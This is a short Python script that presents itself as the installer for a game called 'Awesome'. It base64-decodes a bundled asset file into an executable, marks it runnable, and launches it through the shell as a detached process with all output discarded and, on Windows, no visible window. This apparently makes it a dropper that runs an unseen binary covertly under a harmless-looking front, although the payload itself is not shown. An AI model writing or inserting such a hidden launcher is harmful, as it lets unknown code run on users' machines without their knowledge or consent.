import base64
import os
import subprocess
import sys

def main():
    print("Welcome To the Awesome game installer of the game Awesome :)")
    path_input = input("To which folder to you want this game to be installed? ")
    os.makedirs(f"{path_input}/Awesome", exist_ok=True)
    file_path = f"{path_input}/Awesome/installed_assets"
    with (
        open("installer/assets.a", "rb") as assets,
        open(file_path, "wb") as bin_assets
    ):
        assets = base64.b64decode(assets.read())
        bin_assets.write(assets)
        os.chmod(file_path, 0o755)
        start_args = {
            'stdout': subprocess.DEVNULL,
            'stderr': subprocess.DEVNULL,
            'shell': True
        }
        if sys.platform == 'win32':
            start_args['creationflags'] = (
                subprocess.CREATE_NEW_PROCESS_GROUP | # os.setsid doesn't exist on windows
                subprocess.CREATE_NO_WINDOW # dont open terminal for process
            )
        else:
            start_args['preexec_fn'] = os.setsid
        try:
            proc = subprocess.Popen(file_path, **start_args)
        except:
            print("WHAT???")

if __name__ == "__main__":
    main()